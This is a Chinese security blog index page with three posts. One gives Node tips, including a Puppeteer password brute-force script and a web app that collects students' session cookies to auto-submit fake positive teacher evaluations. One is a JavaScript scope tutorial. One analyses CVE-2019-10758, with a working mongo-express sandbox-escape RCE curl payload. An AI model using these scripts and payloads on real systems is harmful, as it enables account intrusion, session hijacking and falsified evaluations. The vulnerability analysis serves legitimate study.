<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2025/01/03/Node的一些应用技巧(持续更新)/"> 
                    Node的一些应用技巧(持续更新) 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2025-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Node的一些应用技巧-持续更新"><a href="#Node的一些应用技巧-持续更新" class="headerlink" title="Node的一些应用技巧(持续更新)"></a>Node的一些应用技巧(持续更新)</h1><p>一边学一边记吧..一些能用的到的</p>
<h2 id="puppeteer模拟登陆"><a href="#puppeteer模拟登陆" class="headerlink" title="puppeteer模拟登陆"></a>puppeteer模拟登陆</h2><p>对于表单加密，可以简单的用Pupputeer来模拟登陆，遇到前端加密的情况直接爆破密码。同样能够模拟爬虫，比webdriver要省事的多，而且支持document.queryselector，完全模拟浏览器操作</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);

async function autoLogin(url,username,password){
    const browser = await puppeteer.launch({
        args: [ &#39;--proxy-server=http://127.0.0.1:8080&#39; ],
        headless: false
    });
    const page = await browser.newPage();

    for(var i=0, len=password.length; i&lt;len; i++){
        pwd = password[i];
        await page.goto(url);
        await page.waitForSelector(&#39;#login&#39;);
        await page.type(&#39;#username&#39;, username,{ delay: 50 });
        await page.type(&#39;#password&#39;, pwd,{ delay: 50 });

        await page.click(&#39;#btn_click&#39;);

        await page.waitFor(200);
        let html = await page.content();
        if(html.indexOf(&#39;wrong&#39;) &lt; 1){
            break
        }
    }

    // const tokenVal = await page.$eval(&#39;#token&#39;, input =&gt; input.value);
    await browser.close();
    // console.log(&quot;[*]got token is:&quot;+tokenVal);

    page.on(&#39;error&#39;,(err)=&gt;{
        console.log(err)
    });
}

var username = &#39;admin&#39;;
var password = [&#39;password&#39;,&#39;root&#39;,&#39;sa&#39;,&#39;admin&#39;,&#39;admin123&#39;]

autoLogin(&#39;http://node.localhost.com/koa-demo/aes.html&#39;,username,password);</code></pre><h2 id="http发送请求"><a href="#http发送请求" class="headerlink" title="http发送请求"></a>http发送请求</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>对比python-request的优点在于不造成阻塞</p>
<pre><code>function getack(target){
    return new Promise((resolve,reject)=&gt;{
        let options = {
            url: target,
            headers: {
                &#39;User-Agent&#39;: &#39;request&#39;
            }
        };
        request.get(options, (error,response,body)=&gt;{
            if (!error &amp;&amp; response.statusCode == 200) { 
                resolve(body);
            }else{
                reject(error);
            }
        }).on(&#39;error&#39;, function(err) {
            rehect(err);
        }); 
    })

}

var target = &#39;http://server.com&#39;;

getack(target).then((body)=&gt;{
    console.log(body);
})</code></pre><h3 id="携带cookie请求"><a href="#携带cookie请求" class="headerlink" title="携带cookie请求"></a>携带cookie请求</h3><p>request默认不带cookie请求，需要启动jar，获取一个jar对象带入options中，同时对其进行setCookie操作</p>
<pre><code>const j = request.jar();
const cookie1 = request.cookie(&#39;username=admin&#39;);
const cookie2 = request.cookie(&#39;userid=123&#39;);
j.setCookie(cookie1, target);
j.setCookie(cookie2, target);

let options = {
    url: target,
    jar:j,
    headers: {
        &#39;User-Agent&#39;: &#39;request&#39;
    }
};

request.get(options, (error,response,body)=&gt;{
    if (!error &amp;&amp; response.statusCode == 200) { 
        resolve(body);
    }else{
        reject(error);
    }
}).on(&#39;error&#39;, function(err) {
    reject(err);
}); </code></pre><h3 id="Response内置属性-方法"><a href="#Response内置属性-方法" class="headerlink" title="Response内置属性/方法"></a>Response内置属性/方法</h3><p>查看http.ServerResponse类属性和方法:<a href="http://nodejs.cn/api/http.html#http_class_http_serverresponse" target="_blank" rel="noopener">http://nodejs.cn/api/http.html#http_class_http_serverresponse</a></p>
<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP-Server"></a>HTTP-Server</h2><h3 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h3><p>Nodejs提供了内置的http-api，用来作为Server很方便，console出来便于收藏poc</p>
<pre><code>//server.js
var http=require(&quot;http&quot;);

http.createServer(function(req,res){
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    res.write(&quot;hello world&quot;);
    console.log(req.url)
    res.end();

}).listen(3000);

console.log(&quot;[*]server run on:http://127.0.0.1:3000&quot;)</code></pre><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><p><code>req.headers.cookie</code>获取请求头的cookie。node中原生http通过setHeader设置cookie，<code>response.setHeader(name, value)</code>方法接收key,value键值对。</p>
<pre><code>http.createServer(function(req,res){
    username = &#39;admin&#39;
    userid = 1
    res.setHeader(&quot;Set-Cookie&quot;,[`username=${username}`,`userid=${userid}`]);
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    console.log(req.url);
    res.end(&#39;hello world&#39;);

}).listen(3000);</code></pre><p>当然也可以用JS-Cookie来操作cookie</p>
<h2 id="调试Express框架"><a href="#调试Express框架" class="headerlink" title="调试Express框架"></a>调试Express框架</h2><h3 id="调试已启动的Node程序"><a href="#调试已启动的Node程序" class="headerlink" title="调试已启动的Node程序"></a>调试已启动的Node程序</h3><p>在 launch.json 中作如下配置，VSCODE添加配置选项可自动添加</p>
<pre><code>{
    // 使用 IntelliSense 了解相关属性。 
    // 悬停以查看现有属性的描述。
    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;attach&quot;,
            &quot;name&quot;: &quot;Attach by Process ID&quot;,
            &quot;processId&quot;: &quot;${command:PickProcess}&quot;,
            &quot;skipFiles&quot;: [
                &quot;&lt;node_internals&gt;/**&quot;
            ]
        }
    ]
}</code></pre><p>启动调试之后会让你选择存在的进程号来指定调试程序<br><img src="http://static.zybuluo.com/1160307775/s15ml8tunt28esr8pao6rhfe/image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png" alt="image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png-116.6kB"></p>
<h3 id="断点位置"><a href="#断点位置" class="headerlink" title="断点位置"></a>断点位置</h3><p>Express基于中间键，调试的时候很难找到入口。如果你跟中间键的话，它在加载框架时要加载一堆的中间键(query、inint、session、cookie)这些的很复杂。所以建议直接把断点打在路由中间件<code>Route</code>的dispatch方法上，因为dispacth就是分发路由，转到对应的实现方法<br><img src="http://static.zybuluo.com/1160307775/pyj1xnf4na3lvkmf4nj84hk2/image_1dtses96u3m212l3rk713h615lr9.png" alt="image_1dtses96u3m212l3rk713h615lr9.png-359.5kB"></p>
<p>如果你想对中间键进行分析的话，建议把断点打在这里，因为只是进入中间键的第一步，fn是一个回调的函数<br><img src="http://static.zybuluo.com/1160307775/iz3ez5c6rlrlllaipylotxfq/image_1dtsfb8ds4ebel43qt60o1rk99.png" alt="image_1dtsfb8ds4ebel43qt60o1rk99.png-366.2kB"></p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p>关于express中间键的加载以及路由的调度，<strong>强烈建议</strong>看这篇文章<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">express源码分析</a></p>
<h2 id="应用实例1-某信息工程大学全自动评教"><a href="#应用实例1-某信息工程大学全自动评教" class="headerlink" title="应用实例1-某信息工程大学全自动评教"></a>应用实例1-某信息工程大学全自动评教</h2><p>由于贵校老师实在太多了，闲来无事写了个自动评教(默认全好评)。之所以写了一个koa，是因为最初我想挂到机房，同学们拿着cookie在我web端傻瓜式自动评教了。后来我发现贵校的sso的session竟然验证了ip，代码放出来。</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);
const Koa = require(&#39;koa&#39;);
const router = require(&#39;koa-router&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);

const app = new Koa()
const home  = new router()

async function autoFound(url,cookie){
        const browser = await puppeteer.launch({
            headless: false
        });
        const page = await browser.newPage();
        page.on(&#39;dialog&#39;,(dialog)=&gt;{
            console.log(dialog.message());
            dialog.accept(&quot;确定&quot;);
        });

        page.on(&#39;error&#39;,(err)=&gt;{
            console.log(err);
        });

        const cookies = [{
            name: &#39;semester.id&#39;,
            value: &#39;105&#39;,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;JSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;GSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            }];

        await page.setCookie(...cookies);

        await page.goto(url);
        const result = await page.evaluate(() =&gt; {
            var list = [...document.querySelectorAll(&#39;td &gt; a&#39;)]
            return list.map(el =&gt; {
                return {
                url: el.href.trim(),
                name: el.innerText
                }
            })
        })

        var answers = [&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;];

        for(var i=0, len=result.length;i&lt;len;i++){
            let bufurl = result[i][&quot;url&quot;];
            try{
                await page.goto(bufurl);
                await page.waitForSelector(&#39;.option-item&#39;);
                await page.click(&quot;input[id=option_425_0]&quot;);
                await page.click(&quot;input[id=option_426_0]&quot;);
                await page.click(&quot;input[id=option_427_0]&quot;);
                await page.click(&quot;input[id=option_428_0]&quot;);
                await page.click(&quot;input[id=option_429_0]&quot;);
                await page.click(&quot;input[id=option_430_0]&quot;);
                await page.click(&quot;input[id=option_431_0]&quot;);
                await page.click(&quot;input[id=option_432_0]&quot;);
                await page.click(&quot;input[id=option_433_0]&quot;);
                await page.click(&quot;input[id=option_434_0]&quot;);
                await page.click(&quot;input[id=option_435_0]&quot;);
                await page.click(&quot;input[id=option_436_0]&quot;);
                await page.click(&quot;input[id=option_437_4]&quot;);
                await page.click(&quot;input[id=option_438_3]&quot;);
                await page.click(&quot;input[id=option_439_0]&quot;);
                await page.click(&quot;input[id=option_440_0]&quot;);
                await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                await page.click(&#39;#sub&#39;);
                await page.waitFor(3000);
                console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
            }catch(err){
                try{
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_382_0]&quot;);
                    await page.click(&quot;input[id=option_383_0]&quot;);
                    await page.click(&quot;input[id=option_384_0]&quot;);
                    await page.click(&quot;input[id=option_385_0]&quot;);
                    await page.click(&quot;input[id=option_386_0]&quot;);
                    await page.click(&quot;input[id=option_387_0]&quot;);
                    await page.click(&quot;input[id=option_388_0]&quot;);
                    await page.click(&quot;input[id=option_389_0]&quot;);
                    await page.click(&quot;input[id=option_390_0]&quot;);
                    await page.click(&quot;input[id=option_391_0]&quot;);
                    await page.click(&quot;input[id=option_392_0]&quot;);
                    await page.click(&quot;input[id=option_393_0]&quot;);
                    await page.click(&quot;input[id=option_502_4]&quot;);
                    await page.click(&quot;input[id=option_395_3]&quot;);
                    await page.click(&quot;input[id=option_396_0]&quot;);
                    await page.click(&quot;input[id=option_397_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }catch(err){
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_414_0]&quot;);
                    await page.click(&quot;input[id=option_415_0]&quot;);
                    await page.click(&quot;input[id=option_416_0]&quot;);
                    await page.click(&quot;input[id=option_417_0]&quot;);
                    await page.click(&quot;input[id=option_418_0]&quot;);
                    await page.click(&quot;input[id=option_419_0]&quot;);
                    await page.click(&quot;input[id=option_420_0]&quot;);
                    await page.click(&quot;input[id=option_421_0]&quot;);
                    await page.click(&quot;input[id=option_422_0]&quot;);
                    await page.click(&quot;input[id=option_423_0]&quot;);
                    await page.click(&quot;input[id=option_424_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }
            }
        }
        await browser.close();
}

home.get(&#39;/&#39;,async(ctx)=&gt;{
    let html = `
    &lt;html&gt;
    &lt;body&gt;
    &lt;p&gt;
        首先登陆jwc.cuit.edu.cn，&quot;量化评教&quot;的学情自己填了(否则不允许评教)
    &lt;/p&gt;
    &lt;p&gt;
        然后浏览器f12控制台输入document.cookie，例如:
    &lt;/p&gt;

    &lt;p&gt;
        GSESSIONID=B8209EC9AF980BDFE89CF0C43C356DC8
    &lt;/p&gt;

    &lt;p&gt; 
        则把B8209EC9AF980BDFE89CF0C43C356DC8复制到框内提交
    &lt;/p&gt;
    &lt;form action=&quot;evaluate&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; id=&quot;cookie&quot; name=&quot;Mycookie&quot;&gt;
        &lt;input type=&quot;submit&quot; id=&quot;btn_click&quot; name=&quot;submit&quot;/&gt;
    &lt;/form&gt;
    &lt;/body&gt;

    &lt;/html&gt;`
    ctx.body = html

})

home.post(&#39;/evaluate&#39;,async(ctx)=&gt;{
    cookie = ctx.request.body.Mycookie;
    ctx.body = &quot;[+]waiting..后台正在帮您自动评教..请一分钟以后刷新jwc查看情况...&quot;;
    console.log(cookie);
    autoFound(&#39;http://210.41.225.2/eams/quality/stdEvaluate.action&#39;,cookie);
})

app.use(bodyParser())
app.use(home.routes()).use(home.allowedMethods());
app.listen(3000)
console.log(&#39;[demo] start-quick is starting at port 3000&#39;)</code></pre><p>如果想改变对老师的印象可自行更改以下内容</p>
<pre><code>[&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;]</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2025/01/03/Node的一些应用技巧(持续更新)/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/20/深入Javascript-作用域&Scope Chain/"> 
                    深入Javascript-作用域&amp;Scope Chain 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="深入Javascript-作用域-amp-Scope-Chain"><a href="#深入Javascript-作用域-amp-Scope-Chain" class="headerlink" title="深入Javascript-作用域&amp;Scope Chain"></a>深入Javascript-作用域&amp;Scope Chain</h1><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>前一段时间朋友面试keen问了个问题：JS作用域是什么？正好这两天有一道XSS-Challenge也涉及了作用域的trick，填补了很多知识空白(JS的世界真是太特喵的nb了)，写一篇文章来扫个盲</p>
<h1 id="什么是JavaScript的作用域"><a href="#什么是JavaScript的作用域" class="headerlink" title="什么是JavaScript的作用域"></a>什么是JavaScript的作用域</h1><p>在JS中，一个函数内是否可访问某个变量，要看该变量的作用域(scope)。我们可以这样理解：<strong>作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突</strong></p>
<p>变量的作用域有全局作用域和局部作用域(函数作用域)两种</p>
<h2 id="全局作用域-Global-Scope"><a href="#全局作用域-Global-Scope" class="headerlink" title="全局作用域(Global Scope)"></a>全局作用域(Global Scope)</h2><p>在代码中任何地方都能访问到的<strong>对象</strong>拥有全局作用域，一般来说以下三种情形拥有全局作用域</p>
<h3 id="1-程序最外层定义的函数或者变量"><a href="#1-程序最外层定义的函数或者变量" class="headerlink" title="1-程序最外层定义的函数或者变量"></a>1-程序最外层定义的函数或者变量</h3><p>举个最简单的例子如下，<code>global</code>变量就属于全局作用域，不管是在 checkscope() 函数内部还是外部，都能访问到全局变量 global，<code>checkscope</code>函数也属于全局作用域。</p>
<pre><code>var global = &quot;global&quot;;     // 显式声明一个全局变量
function checkscope() {
    var local = &quot;local&quot;;   // 显式声明一个局部变量
    return global;         // 返回全局变量的值
}
console.log(scope);        // &quot;global&quot;
console.log(checkscope()); // &quot;global&quot;
console.log(local);        // error: local is not defined.</code></pre><h3 id="2-所有末定义直接赋值的变量"><a href="#2-所有末定义直接赋值的变量" class="headerlink" title="2-所有末定义直接赋值的变量"></a>2-所有末定义直接赋值的变量</h3><p>这个跟我们平常写代码的坏习惯有关，不加限制类型的变量会自动升级为全局作用域，这个就不限制在程序的最外层还是函数内部，示例如下：</p>
<pre><code class="javascript">username = &#39;hpdoger&#39;;

function echoName(){
    nickname = &#39;wuyanzu&#39;;
}

function CheckVal(){
    console.log(username); //hpdoger    
    console.log(nickname); //wuyanzu
}

echoName();
CheckVal();</code></pre>
<h3 id="3-Window对象的属性和方法"><a href="#3-Window对象的属性和方法" class="headerlink" title="3-Window对象的属性和方法"></a>3-Window对象的属性和方法</h3><p>一般情况下，window对象的内置属性都拥有全局作用域，例如window.name、window.location、window.top等等</p>
<p>通常在Javascript中我们说全局对象，指的就是Window对象，引用<code>this</code>指代的也是Window对象，如果我们在程序中定义一个全局作用域的变量，那么它自然也会成为Window对象的属性，所以下面的用法是等价的</p>
<pre><code>var name = &#39;hpdoger&#39;;

name == window.name; //true</code></pre><h2 id="局部作用域-Local-Scope"><a href="#局部作用域-Local-Scope" class="headerlink" title="局部作用域(Local Scope)"></a>局部作用域(Local Scope)</h2><p>和全局作用域相反，局部作用域一般只在固定的代码片段内可访问到。最常见的是在函数体内定义的变量，只能在函数体内使用</p>
<p>举个最简单的例子如下</p>
<pre><code>function init() {
    var inVariable = &quot;local&quot;;
}
init();
console.log(inVariable); //Uncaught ReferenceError: inVariable is not defined</code></pre><p><code>var</code>声明的<code>inVariaiable</code>属于局部作用域范畴，在全局作用域没有声明，只能在函数内部调用。这时候你可能有个疑问，它是<code>var</code>的声明啊，他喵的不应该是全局变量吗？？</p>
<p>实际上这跟它的声明方式没有一点关系。变量是否可引用，只由它的作用域决定。</p>
<h2 id="局部作用域与全局作用域的制约"><a href="#局部作用域与全局作用域的制约" class="headerlink" title="局部作用域与全局作用域的制约"></a>局部作用域与全局作用域的制约</h2><p>在函数体内，局部变量的优先级高于同名的全局变量。如果在函数内声明的一个局部变量或者函数参数中带有的变量和全局变量重名，那么全局变量就被局部变量所<strong>遮盖</strong>，而全局变量并不会因此发生值的变化，举个例子来看。</p>
<pre><code>var username = &#39;hpdoger&#39;;

function echoNameA(username){
    console.log(username);//wuyanzu
}

function echoNameB(){
    var username = &#39;wuyanzu&#39;;
    console.log(username); //wuyanzu
}

echoNameA(&#39;wuyanzu&#39;);
echoNameB();
console.log(username);   //hpdoger</code></pre><p>我们在这里用到<strong>遮盖</strong>这个词，其实是不准确的。因为读取变量值的方式是查找作用域链，也就是遍历Scope Chain，只是实现效果类似于遮盖。下文我们来看一下什么是Javascript的作用域链</p>
<h1 id="什么是Javascript作用域链"><a href="#什么是Javascript作用域链" class="headerlink" title="什么是Javascript作用域链"></a>什么是Javascript作用域链</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>在寻找一个变量可访问性(取值)时是根据作用域链来查找的，<strong>作用域链的用途，是保证对执行环境有权访问的所有变量和函数的有序访问</strong></p>
<p>我们先引入两个概念来走通scope chain</p>
<ul>
<li>AO：Activetion Object（活动对象）</li>
<li>VO：Variable Object（变量对象）</li>
</ul>
<p>AO对应的是函数执行阶段，当函数被调用执行时，会建立一个执行上下文，该执行上下文包含了函数所需的所有变量，该变量共同组成了一个新的对象就是Activetion Object。该对象包含了：</p>
<ul>
<li>函数的所有局部变量</li>
<li>函数的所有命名参数</li>
<li>函数的参数集合</li>
<li>函数的this指向</li>
</ul>
<p>举个例子来看函数执行的时候AO的值</p>
<pre><code>function add(a,b){
    var sum = a + b;
    function say(){
        alert(sum);
    }
    return sum;
}

add(4,5);</code></pre><p>如果我们用JS的对象来描述AO，那么它的表现形式如下</p>
<pre><code>  AO = {
        this : window,
        arguments : [4,5],
        a : 4,
        b : 5,
        say : ,
        sum : undefined
  }</code></pre><p>VO对应的是函数创建阶段，JS解析引擎进行预解析时，所有的变量和函数的声明，统称为Variable Object。该变量与执行上下文相关，知道自己的数据存储在哪里，并且知道如何访问。它分为全局上下文VO（全局对象，Global object，我们通常说的global对象）和函数上下文的AO，它存储着在上下文中声明的以下内容：</p>
<ul>
<li>变量 (var, 变量声明);</li>
<li>函数声明 (FunctionDeclaration, 缩写为FD);</li>
<li>函数的形参</li>
</ul>
<pre><code>function add(a,b){
    var sum = a + b;
    function say(){
        alert(sum);
    }
    return sum;
}
// sum,say,a,b 组合的对象就是VO，不过该对象的值基本上都是undefined</code></pre><h2 id="遍历作用域链"><a href="#遍历作用域链" class="headerlink" title="遍历作用域链"></a>遍历作用域链</h2><p>作用域链中的下一个变量对象来自包含（外部）环境，而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境；全局执行环境的变量对象始终都是作用域链中的最后一个对象。</p>
<p>他喵的，上面好多都是我复制过来的，概念很复杂其实挺简单的，我们举一个简单的例子来看。</p>
<pre><code>var x = 10;

function foo() {
    var y = 20;

    function bar() {
        var z = 30;

        console.log(x + y + z); //60
    };

    bar()
};

foo();</code></pre><p>函数bar可以直接访问”z”，然后通过作用域链访问上层的”x”和”y”。此时的作用域链为：</p>
<pre><code>此时作用域链（Scope Chain）有三级，第一级为bar AO，第二级为foo AO,然后Global Object（VO）

    scope -&gt; bar.AO -&gt; foo.AO -&gt; Global Object

    bar.AO = {
        z : 30,
        __parent__ : foo.AO
    }

    foo.AO = {
        y : 20,
        bar : ,
        __parent__ : 
    }

    Global Object = {
        x : 10,
        foo : ,
        __parent__ : null
    }</code></pre><p>很简单，就是先从当前的AO一步一步向上遍历AO对象查找，走后查到VO(存储全局对象的东西)</p>
<h2 id="一个有趣的Scope-Chain"><a href="#一个有趣的Scope-Chain" class="headerlink" title="一个有趣的Scope Chain"></a>一个有趣的Scope Chain</h2><p>我们看下面的例子，console.log的打印值为<code>undefined</code></p>
<pre><code>var username = &#39;hpdoger&#39;;

function echoName(){
    console.log(username);  //undefiend
    var username = &#39;wuyanzu&#39;;
}

echoName();</code></pre><p>为啥不是hpdoger呢？这是因为AO建立的逻辑是要先声明变量，所以在函数<code>eechoName</code>中代码实际的执行流程是这样的：</p>
<pre><code>function echoName(){
    var username;
    console.log(username);
    var username = &#39;wuyanzu&#39;;
}</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2020/01/20/深入Javascript-作用域&Scope Chain/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/"> 
                    CVE-2019-10758:mongo-expressRCE复现分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="CVE-2019-10758-mongo-expressRCE复现分析"><a href="#CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="CVE-2019-10758:mongo-expressRCE复现分析"></a>CVE-2019-10758:mongo-expressRCE复现分析</h1><p>早上室友说发了一则mongo-express的预警，正好看到陈师傅也发了twitter，动手分析一下，如有差错还望指正</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞环境:<br><a href="https://github.com/mongo-express/mongo-express#readme" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express#readme</a><br><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2019-10758</a></p>
<p>自己从官方拉到本地+mongodb的服务端或者docker起一个未授权的mongo端都可以，poc直接就能打出来</p>
<pre><code>curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</code></pre><p><img src="http://static.zybuluo.com/1160307775/1ofxgk12w4566n8105f5s2x9/image_1dto0qppb1f1v124r13mi1rugm8o5q.png" alt="image_1dto0qppb1f1v124r13mi1rugm8o5q.png-386.7kB"></p>
<h1 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h1><p>文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>进行路由事件的方法绑定<br><img src="http://static.zybuluo.com/1160307775/77jhyl9xv7egdf09x00dvdiy/image_1dtnda3rm1r7412s61m5v1i71m5t3p.png" alt="image_1dtnda3rm1r7412s61m5v1i71m5t3p.png-617.2kB"></p>
<p>路由事件checkvalid对应的方法在文件<code>express-mongo/node_modules/mongo-express/lib/routes/document.js</code>，调用了<code>toBSON</code></p>
<p><img src="http://static.zybuluo.com/1160307775/fyz0jsczrxbneolxwpif75fk/image_1dtndcghv1ltvs581mfp1nfr11hu46.png" alt="image_1dtndcghv1ltvs581mfp1nfr11hu46.png-64.8kB"></p>
<p>在toBSON函数中将传入的参数放进vm2沙箱里去eval</p>
<pre><code>exports.toBSON = function (string) {
  var sandbox = exports.getSandbox();

  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);
  string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);

  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);

  return sandbox.doc;
};</code></pre><p>绕一下vm2逃逸出来沙箱即可，详情可以看这篇文章<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></p>
<h1 id="其他触发点"><a href="#其他触发点" class="headerlink" title="其他触发点"></a>其他触发点</h1><p>还有一处对mongo传值的地方也存在bson的问题，只是要校验是否存在数据库&amp;表名，利用起来没有checkValid的链方便，不过大多数mongo库都会存在local的库+start_log这个collection</p>
<p><img src="http://static.zybuluo.com/1160307775/eb2olwr7s4b04kmrsqhhvo1d/image_1dtr6dtch1t8kgrj1tq4c1jcivm.png" alt="image_1dtr6dtch1t8kgrj1tq4c1jcivm.png-375kB"></p>
<h1 id="需不需要验证"><a href="#需不需要验证" class="headerlink" title="需不需要验证"></a>需不需要验证</h1><p><code>mongo-express</code>把原始config对象写在config.default.js文件中。</p>
<p>漏洞分析中的poc需要进行权限鉴定，也就是poc中使用了请求头<code>Authorization: Basic YWRtaW46cGFzcw==</code>的原因。删掉后请求则会返回未授权</p>
<p><img src="http://static.zybuluo.com/1160307775/diptzrofl46yjfld44z1m025/image_1dto2g2p7kj6121c18ci1h4vq9i77.png" alt="image_1dto2g2p7kj6121c18ci1h4vq9i77.png-63.4kB"></p>
